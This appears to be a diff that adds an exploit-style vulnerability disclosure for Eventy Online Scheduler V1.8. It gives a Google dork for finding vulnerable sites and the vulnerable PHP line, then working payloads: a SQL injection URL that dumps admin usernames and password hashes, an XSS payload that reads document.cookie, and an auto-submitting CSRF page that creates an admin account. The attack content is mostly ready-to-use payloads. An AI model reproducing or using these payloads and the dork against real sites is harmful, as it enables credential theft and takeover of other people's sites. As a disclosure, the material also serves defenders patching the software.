@@ -1,0 +1,53 @@
+Eventy Online Scheduler V1.8   - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         :
+http://calendarscripts.info/event-calendar-software.html
+.:. Dork           : "Powered by CalendarScripts.info"
+####################################################################
+
+[1] Sql Injection
+==================
+VULNERABILITY
+##############
+/eve_event.php (line 15-16)
+
+$query="SELECT * FROM $T_EVENTS WHERE id=".$_GET['id'];
+
+$event=$DB->sq($query);
+
+#########
+EXPLOIT
+#########
+http://site/eve_event.php?id=null+and+1=2+union+select+1,group_concat(id,0x3a,username,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from+evp_admin
+
+
+[2] Cross Site Scripting
+=========================
+
+
+http://site/eventy.php?next=1&selmonth=January&selyear=2014'"()%26%25<ScRiPt
+>prompt(document.cookie)</ScRiPt>
+
+
+[3] Cross Site Request Forgery
+==============================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="http://site/a_admins.php">
+<input type="hidden" name="username" value="admin"/>
+<input type="hidden" name="pass" value="admin"/>
+<input type="hidden" name="add" value="1"/>
+</form>
+</body>
+</html>
+
+
+####################################################################
